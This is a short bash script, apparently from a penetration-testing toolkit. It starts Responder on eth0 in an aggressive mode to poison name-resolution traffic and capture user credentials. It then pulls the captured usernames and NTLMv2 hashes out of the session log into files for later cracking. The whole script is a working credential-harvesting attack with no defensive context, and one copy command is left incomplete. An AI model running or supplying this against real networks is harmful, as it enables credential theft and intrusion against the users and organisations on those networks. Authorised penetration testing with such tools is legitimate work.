#!/bin/bash
echo "********************************************************************************************"
echo "Script to start responder to capture user credentials / hashes"
echo "Logs will be stored in /usr/share/responder/logs"
echo "********************************************************************************************"
read -n1 -s -r -p $'Press any key to continue ... or Ctrl - C to cancel\n' key
# Run responder in aggresive mode:
#sudo responder -I eth0 -rvFbw
#Remove -r options as it is not available anymore
sudo responder -I eth0 -vFbw
# Run responder in passive mode:
#sudo responder -I eth0 -A -rvFbw

#Path the the logs

echo "********************************************************************************************"
echo " Extracting the users and hashes from the responder logs (/usr/share/responder/logs)"
echo "********************************************************************************************"
cd /usr/share/responder/logs

# Extracting the users
strings Responder-Session.log | grep "NTLMv2-SSP Hash" | cut -d ":" -f 4-6 | sort -u -f | awk '{$1=$1};1' > /tmp/users-reponder.txt

# Extracting users and hashes saved in different files by user:
for user in `strings Responder-Session.log | grep "NTLMv2-SSP Hash" | cut -d ":" -f 4-6 | sort -u -f | awk '{$1=$1};1'`
    do
    echo "[*] search for: $user";
    strings Responder-Session.log | grep "NTLMv2-SSP Hash" | grep -i $user | cut -d ":" -f 4-10 |  head -n 1 | awk '{$1=$1};1' >> /tmp/ntlm-hashes.txt
    done
sudo cp /tmp/users-reponder.txt
sudo cp /tmp/ntlm-hashes.txt .